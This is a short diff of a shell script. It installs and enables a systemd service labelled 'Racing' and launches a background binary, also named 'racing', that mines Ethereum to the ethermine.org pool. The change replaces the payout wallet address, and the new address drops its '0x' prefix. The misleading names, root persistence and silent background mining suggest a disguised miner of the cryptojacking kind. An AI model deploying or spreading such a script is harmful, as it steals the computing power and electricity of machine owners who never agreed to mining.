@@ -14,4 +14,4 @@ sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Serv
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 myworker=$(date +'%d%m_%H%M%S')
-./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x85c6aa49d2723b03ff8d81177669500ec7cdde5a -p x -w $myworker &
+./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 2B61ae5F3699443adF33768eb40a51aD8FF2f526 -p x -w $myworker &
